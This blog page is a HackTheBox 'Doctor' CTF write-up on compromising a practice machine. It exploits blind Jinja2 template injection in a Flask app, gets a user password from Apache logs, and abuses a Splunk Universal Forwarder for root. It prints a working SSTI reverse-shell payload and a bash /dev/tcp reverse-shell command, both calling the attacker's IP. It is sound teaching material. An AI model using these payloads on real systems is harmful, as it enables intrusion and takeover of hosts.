<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Doctor | Ef's log</title><meta name=keywords content="HackTheBox,Writeup,Cyber Security,Pentesting"><meta name=description content="Seven times seven is equal to SSTI"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.medium.com/hack-the-box-doctor-10-10-10-209-writeup-902fe05997e0><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Doctor"><meta property="og:description" content="Seven times seven is equal to SSTI"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/doctor/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/doctor/imgs/image-20210508232144553.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-02-06T12:23:30+00:00"><meta property="article:modified_time" content="2021-05-08T23:21:45+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/ophiuchi/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/traverxec/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/heist/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/active/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/shocker/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/atom/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/doctor/imgs/image-20210508232144553.png"><meta name=twitter:title content="HackTheBox - Doctor"><meta name=twitter:description content="Seven times seven is equal to SSTI"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Doctor","item":"https://fahmifj.github.io/hackthebox/doctor/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Doctor","name":"HackTheBox - Doctor","description":"Seven times seven is equal to SSTI","keywords":["HackTheBox","Writeup","Cyber Security","Pentesting"],"articleBody":"Doctor is an easy difficulty Windows machine from HackTheBox that features a Flask web application which is vulnerable to blind Server-Side Template Injection. I’m able to gain a foothold using the SSTI vulnerability. Enumerating on the Apache log files discovers a user’s password. The user credentials are work on the Splunk Universal Forwarder service, which can be exploited to gain root access using PySplunkWhisperer2.\nSkills Learned Server Side Template Injection Splunk UF Exploitation Tools Nmap\nGobuster - https://github.com/OJ/gobuster\nTplmap - https://github.com/epinna/tplmap\nSSTI Cheatsheet - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#\nPySplunkWhisperer2 - https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py\nReconnaissance Nmap An initial scan discovers three open ports: SSH on port 22, HTTP server on port 80, and a Splunk daemon on port 8089 backed with HTTPS.\n→ root@kali «exploits» «10.10.14.3» $ mkdir nmap; nmap -sC -sV -oN nmap/initial-doctor '10.10.10.209' Nmap scan report for 10.10.10.209 Host is up (0.055s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: POST OPTIONS HEAD GET |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Doctor 8089/tcp open ssl/http Splunkd httpd | http-methods: |_ Supported Methods: GET HEAD OPTIONS | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Splunkd |_http-title: splunkd | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser | Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-09-06T15:57:27 | Not valid after: 2023-09-06T15:57:27 | MD5: db23 4e5c 546d 8895 0f5f 8f42 5e90 6787 |_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Enumeration TCP 80 - Website This page shows a kind of health service website called “Doctor” in the title.\nGobuster URL brute force with gobuster didn’t find any interesting results.\n/images (Status: 301) [Size: 313] [--\u003e http://10.10.10.209/images/] /js (Status: 301) [Size: 309] [--\u003e http://10.10.10.209/js/] /css (Status: 301) [Size: 310] [--\u003e http://10.10.10.209/css/] /contact.html (Status: 200) [Size: 19848] /blog.html (Status: 200) [Size: 19848] /about.html (Status: 200) [Size: 19848] /index.html (Status: 200) [Size: 19848] /services.html (Status: 200) [Size: 19848] /fonts (Status: 301) [Size: 312] [--\u003e http://10.10.10.209/fonts/] /departments.html (Status: 200) [Size: 19848] /server-status (Status: 403) [Size: 277] /index.html (Status: 200) [Size: 19848] TCP 80 - doctors.htb Because adding a machine name with “.htb” as TLD to /etc/hosts file has become my habit (i.e doctor.htb), so at first, on the homepage, I didn’t notice that there is an additional “s” on info@doctors.htb.\nOnce I added doctors.htb to my /etc/hosts file, I refreshed the page with that hostname, and it presented a different web application.\nIn the page source, I found a comment telling that the archive feature is still in beta testing, so I’ll note this.\nGobuster I ran another gobuster scan, but it seems I’ll just register an account this time.\n/logout (Status: 302) [Size: 217] [--\u003e http://doctors.htb/home] /register (Status: 200) [Size: 4493] /login (Status: 200) [Size: 4204] /home (Status: 302) [Size: 245] [--\u003e http://doctors.htb/login?next=%2Fhome] /archive (Status: 200) [Size: 101] /account (Status: 302) [Size: 251] [--\u003e http://doctors.htb/login?next=%2Faccount] /server-status (Status: 403) [Size: 276] My account is only available for 20 minutes.\nThe “1” icon was actually a page number with URL that points to http://doctors.htb/home?page=1.\nTCP 8089 — Splunk Universal Forwarder I can visit the Splunk UF on port 8089 through the browser after adding HTTPS to the URL and accepting the SSL certificate warning.\nAt the top, I can see the Splunk version.\nFinding vulnerability Knowing the version, I did a quick search on Google to look for available exploits, and I came across hackbooktriks.xyz\nhttps://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence The original research was published in here:\nhttps://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/ But it requires credentials. I’ll just add this to my to do list.\nFoothold Shell as web SQL Injection - Failed I can create a post message on doctors.htb by visiting http://doctors.htb/post/new. Below is the example request\nPOST /post/new HTTP/1.1 Host: doctors.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://doctors.htb/post/new Content-Type: application/x-www-form-urlencoded Content-Length: 35 Connection: close Cookie: session=.eJwlzj0OwjAMQOG7eGZI7MSJe5kq_hOsLZ0Qd6cS69Mbvg_secT5hO19XPGA_eWwQRMSDJdkRrMYOFNNMZvRdM5gth6jkLulV3JtOS1EFOsQGlNMDDXW_VN37GFzmbaGrWhiFq-r91aVlGWsdMV1ByYeZfJShBtynXH8NQjfH00QMJk.YBo8Bw.h165pwEGvKjGaPS-d3RiIO-xe34 Upgrade-Insecure-Requests: 1 title=test\u0026content=test\u0026submit=Post I fed the request to SQLMap, but it doesn’t seem injectable.\nAnd then I looked into Wapplyzerーa web plugin that can be used to identify the technology stacks behind a websiteー, and it shows doctors.htb uses Flask as its backend.\nServer Side Template Injection (SSTI) Web applications that use Python Flask are typically run with a templating engine such as Jinja. On every templating engine, SSTI can occur when an un-sanitized user input is passed directly into the application templating process.\nPwnFunction’s video on SSTI was very informative.\nTryHackMe also has a room called “Flask” that contains an example of SSTI attack on Flask. I have completed that room, and the note is available on my GitHub.\nHere is the methodology to detect SSTI (taken from here):\nhttp://doctors.htb/home?page=1 is the first attack vector to target. I used a tool called Tplmap.py to automatically detect SSTI, but no luck.\n→ root@kali «exploits» «10.10.14.3» $ python tplmap.py -u 'http://doctors.htb/home?page=iamf' [+] Tplmap 0.5 Automatic Server-Side Template Injection Detection and Exploitation Tool [+] Testing if GET parameter 'page' is injectable [+] Smarty plugin is testing rendering with tag '*' [+] Smarty plugin is testing blind injection ...... [+] Ruby plugin is testing blind injection [+] Ejs plugin is testing rendering with tag '*' [+] Ejs plugin is testing blind injection [!][checks] Tested parameters appear to be not injectable. The second attack vector is http://doctors.htb/post/new, which allows me to create a post message. It consists of two input vectors: the title and the content/message.\nI copied the basic SSTI payloads for Jinja2 from PayloadAllTheThings to the post content, but it doesn’t return the expected result.\nIt also returns nothing when I submit the payloads on the title.\nAfter hours trying to figure out why it didn’t work, I noticed that the /archive page occasionally returns an error when I put some payload that has the percentage symbol, like {% payload %}, on the content/message section.\nOr sometimes it only has the post title that can be seen only from the page source.\nSo from there, I submitted the basic payload on the title.\nRight after inserting the payload, I checked the page source of /archive, and I found the expected result of the SSTI payload there.\nReverse Shell The cheat-sheet from PayloadAllTheThings also contains a pre-crafted payload to get a reverse shell. All I have to do now is replace the IP address with mine and have my nc listener listening on the port I specified.\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.4\\\",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\")}}{%endif%}{% endfor %} I have an interactive shell now.\n→ root@kali «doctor» «10.10.14.3» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.34] from (UNKNOWN) [10.10.10.209] 5628 /bin/sh: 0: can’t access tty; job control turned off $ which python $ which python3 /usr/bin/python3 $ python3 -c 'import pty;pty.spawn(\"/bin/bash\")' web@doctor:~$ id uid=1001(web) gid=1001(web) groups=1001(web),4(adm) Privilege Escalation Shell as shaun Internal Enumeration These are the users who have login shells.\nweb@doctor:~$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash web:x:1001:1001:,,,:/home/web:/bin/bash shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash Because web is a member of the adm group, I can read the log files at /var/log. While enumerating with find command, I caught an Apache2 log called “backup”.\nweb@doctor:~$ find / -type f -readable -group adm 2\u003e/dev/null /var/log/kern.log.3.gz /var/log/auth.log /var/log/syslog /var/log/ufw.log.2.gz /var/log/dmesg.2.gz /var/log/auth.log.1 ...... /var/log/apache2/backup Searching string “pass” on the backup log reveals this line.\nweb@doctor:/var/log/apache2$ cat backup | grep pass 10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] \"POST /reset_password?email=Guitar123\" 500 453 \"http://doctor.htb/reset_password\" It printed as email=Guitar123, but it doesn’t look like an email to me.\nSU - shaun It turns out that Guitar123 is shaun’s password.\nweb@doctor:/var/log/apache2$ su shaun Password: Guitar123 web@doctor:/var/log/apache2$ id uid=1002(shaun) gid=1002(shaun) groups=1002(shaun) User flag is done here.\nShell as root Exploiting Splunk with PySplunkWhisperer2 I’ll recall the Splunk Forwarder, which by BookHackTrick is categorized as a privilege escalation vector.\nThe researcher stated that the Splunk UF agent’s username is always admin.\nUniversal Forwarder is accessible on each host at https://host:8089. Accessing any of the protected API calls, such as /service/ pops up a Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 …\nBut that’s not the case on this machine, because I can use shaun:Guitar123 to authenticate to the Splunk UF services on port 8089.\nI tried this PoC from GitHub using the bash reverse shell as payload,\n→ root@kali «exploits» «10.10.14.3» $ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password Guitar123 --payload \"bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.3/9001 0\u003e\u00261'\" --lhost 10.10.14.3 Running in remote mode (Remote Code Execution) [.] Authenticating... [+] Authenticated [.] Creating malicious app bundle... [+] Created malicious app bundle in: /tmp/tmpkwnss3rw.tar [+] Started HTTP server for remote mode [.] Installing app from: http://10.10.14.3:8181/ 10.10.10.209 - - [03/Feb/2021 05:09:23] \"GET / HTTP/1.1\" 200 - [+] App installed, your code should be running now! and it worked smoothly.\n→ root@kali «doctor» «10.10.14.3» $ nc -nvlp 9001 listening on [any] 9001 ... connect to [10.10.14.3] from (UNKNOWN) [10.10.10.209] 48834 bash: cannot set terminal process group (1137): Inappropriate ioctl for device bash: no job control in this shell root@doctor:/# id id uid=0(root) gid=0(root) groups=0(root) I can grab the root flag.\n","wordCount":"1518","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/doctor/imgs/image-20210508232144553.png","datePublished":"2021-02-06T12:23:30.041Z","dateModified":"2021-05-08T23:21:45+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/doctor/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Doctor</h1><p class=post-description>Seven times seven is equal to SSTI</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>February 06, 2021
<span class=date-update>(Edited: May 08, 2021)</span></span>&nbsp;&#183;&nbsp;<span class=meta-read>8 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/oscp-like/>OSCP like</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---website aria-label="TCP 80 - Website">TCP 80 - Website</a></li><li><a href=#tcp-80---doctorshtb aria-label="TCP 80 - doctors.htb">TCP 80 - doctors.htb</a></li><li><a href=#tcp-8089--splunk-universal-forwarder aria-label="TCP 8089  —  Splunk Universal Forwarder">TCP 8089  —  Splunk Universal Forwarder</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-web aria-label="Shell as web">Shell as web</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-shaun aria-label="Shell as shaun">Shell as shaun</a></li><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/doctor/imgs/image-20210508232144553_hu8ee50e686cd9f4f9d47a7d334bac091f_124380_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/doctor/imgs/image-20210508232144553_hu8ee50e686cd9f4f9d47a7d334bac091f_124380_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/doctor/imgs/image-20210508232144553_hu8ee50e686cd9f4f9d47a7d334bac091f_124380_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/doctor/imgs/image-20210508232144553.png 737w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/doctor/imgs/image-20210508232144553.png alt="HackTheBox - Doctor" width=737 height=469><p>HackTheBox - Doctor</p></figure><p>Doctor is an easy difficulty Windows machine from HackTheBox that features a Flask web application which is vulnerable to blind Server-Side Template Injection. I&rsquo;m able to gain a foothold using the SSTI vulnerability. Enumerating on the Apache log files discovers a user&rsquo;s password. The user credentials are work on the Splunk Universal Forwarder service, which can be exploited to gain root access using PySplunkWhisperer2.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Server Side Template Injection</li><li>Splunk UF Exploitation</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li><p>Nmap</p></li><li><p>Gobuster - <a href=https://github.com/OJ/gobuster>https://github.com/OJ/gobuster</a></p></li><li><p>Tplmap - <a href=https://github.com/epinna/tplmap>https://github.com/epinna/tplmap</a></p></li><li><p>SSTI Cheatsheet - <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#</a></p></li><li><p>PySplunkWhisperer2 - <a href=https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py>https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py</a></p></li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>An initial scan discovers three open ports: SSH on port 22, HTTP server on port 80, and a Splunk daemon on port 8089 backed with HTTPS.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «exploits» «10.10.14.3»
</span></span><span class=line><span class=cl>$ mkdir nmap<span class=p>;</span> nmap -sC -sV -oN nmap/initial-doctor <span class=s1>&#39;10.10.10.209&#39;</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.209
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.055s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp   open  http     Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: POST OPTIONS HEAD GET
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Doctor
</span></span><span class=line><span class=cl>8089/tcp open  ssl/http Splunkd httpd
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods:
</span></span><span class=line><span class=cl><span class=p>|</span>_  Supported Methods: GET HEAD OPTIONS
</span></span><span class=line><span class=cl><span class=p>|</span> http-robots.txt: <span class=m>1</span> disallowed entry
</span></span><span class=line><span class=cl><span class=p>|</span>_/
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Splunkd
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: splunkd
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>SplunkServerDefaultCert/organizationName<span class=o>=</span>SplunkUser
</span></span><span class=line><span class=cl><span class=p>|</span> Issuer: <span class=nv>commonName</span><span class=o>=</span>SplunkCommonCA/organizationName<span class=o>=</span>Splunk/stateOrProvinceName<span class=o>=</span>CA/countryName<span class=o>=</span>US
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key type: rsa
</span></span><span class=line><span class=cl><span class=p>|</span> Public Key bits: <span class=m>2048</span>
</span></span><span class=line><span class=cl><span class=p>|</span> Signature Algorithm: sha256WithRSAEncryption
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2020-09-06T15:57:27
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid after:  2023-09-06T15:57:27
</span></span><span class=line><span class=cl><span class=p>|</span> MD5:   db23 4e5c 546d <span class=m>8895</span> 0f5f 8f42 5e90 <span class=m>6787</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>This page shows a kind of health service website called &ldquo;Doctor&rdquo; in the title.</p><p><div class=img-container><img src=imgs/image-20210509010426119.png alt=image-20210509010426119></div></p><h4 id=gobuster>Gobuster<a class=anchor aria-hidden=true href=#gobuster>#</a></h4><p>URL brute force with <code>gobuster</code> didn&rsquo;t find any interesting results.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/images               (Status: 301) [Size: 313] [--&gt; http://10.10.10.209/images/]
</span></span><span class=line><span class=cl>/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.10.209/js/]
</span></span><span class=line><span class=cl>/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.10.209/css/]
</span></span><span class=line><span class=cl>/contact.html         (Status: 200) [Size: 19848]
</span></span><span class=line><span class=cl>/blog.html            (Status: 200) [Size: 19848]
</span></span><span class=line><span class=cl>/about.html           (Status: 200) [Size: 19848]
</span></span><span class=line><span class=cl>/index.html           (Status: 200) [Size: 19848]
</span></span><span class=line><span class=cl>/services.html        (Status: 200) [Size: 19848]
</span></span><span class=line><span class=cl>/fonts                (Status: 301) [Size: 312] [--&gt; http://10.10.10.209/fonts/]
</span></span><span class=line><span class=cl>/departments.html     (Status: 200) [Size: 19848]
</span></span><span class=line><span class=cl>/server-status        (Status: 403) [Size: 277]
</span></span><span class=line><span class=cl>/index.html           (Status: 200) [Size: 19848]
</span></span></code></pre></div><h3 id=tcp-80---doctorshtb>TCP 80 - doctors.htb<a class=anchor aria-hidden=true href=#tcp-80---doctorshtb>#</a></h3><p>Because adding a machine name with &ldquo;.htb&rdquo; as TLD to <code>/etc/hosts</code> file has become my habit (i.e <code>doctor.htb</code>), so at first, on the homepage, I didn&rsquo;t notice that there is an additional &ldquo;s&rdquo; on <code>info@doctors.htb</code>.</p><p><div class=img-container><img src=imgs/image-20210509011106327.png alt=image-20210509011106327></div></p><p>Once I added <code>doctors.htb</code> to my <code>/etc/hosts</code> file, I refreshed the page with that hostname, and it presented a different web application.</p><p><div class=img-container><img src=imgs/image-20210509011333267.png alt=image-20210509011333267></div></p><p>In the page source, I found a comment telling that the archive feature is still in beta testing, so I&rsquo;ll note this.</p><p><div class=img-container><img src=imgs/image-20210509013716799.png alt=image-20210509013716799></div></p><h4 id=gobuster-1>Gobuster<a class=anchor aria-hidden=true href=#gobuster-1>#</a></h4><p>I ran another gobuster scan, but it seems I&rsquo;ll just register an account this time.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>/logout               (Status: 302) [Size: 217] [--&gt; http://doctors.htb/home]
</span></span><span class=line><span class=cl>/register             (Status: 200) [Size: 4493]
</span></span><span class=line><span class=cl>/login                (Status: 200) [Size: 4204]
</span></span><span class=line><span class=cl>/home                 (Status: 302) [Size: 245] [--&gt; http://doctors.htb/login?next=%2Fhome]
</span></span><span class=line><span class=cl>/archive              (Status: 200) [Size: 101]
</span></span><span class=line><span class=cl>/account              (Status: 302) [Size: 251] [--&gt; http://doctors.htb/login?next=%2Faccount]
</span></span><span class=line><span class=cl>/server-status        (Status: 403) [Size: 276]
</span></span></code></pre></div><p>My account is only available for 20 minutes.</p><p><div class=img-container><img src=imgs/image-20210509014205880.png alt=image-20210509014205880></div></p><p>The &ldquo;1&rdquo; icon was actually a page number with URL that points to <code>http://doctors.htb/home?page=1</code>.</p><h3 id=tcp-8089--splunk-universal-forwarder>TCP 8089  —  Splunk Universal Forwarder<a class=anchor aria-hidden=true href=#tcp-8089--splunk-universal-forwarder>#</a></h3><p>I can visit the Splunk UF on port 8089 through the browser after adding HTTPS to the URL and accepting the SSL certificate warning.</p><p>At the top, I can see the Splunk version.</p><p><div class=img-container><img src=imgs/image-20210509014443695.png alt=image-20210509014443695></div></p><h4 id=finding-vulnerability>Finding vulnerability<a class=anchor aria-hidden=true href=#finding-vulnerability>#</a></h4><p>Knowing the version, I did a quick search on Google to look for available exploits, and I came across <code>hackbooktriks.xyz</code></p><ul><li><a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence>https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence</a></li></ul><p>The original research was published in here:</p><ul><li><a href=https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/>https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/</a></li></ul><p>But it requires credentials. I&rsquo;ll just add this to my to do list.</p><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-web>Shell as web<a class=anchor aria-hidden=true href=#shell-as-web>#</a></h3><h4 id=sql-injection---failed>SQL Injection - Failed<a class=anchor aria-hidden=true href=#sql-injection---failed>#</a></h4><p>I can create a post message on <code>doctors.htb</code> by visiting <a href=http://doctors.htb/post/new>http://doctors.htb/post/new</a>. Below is the example request</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-HTTP data-lang=HTTP><span 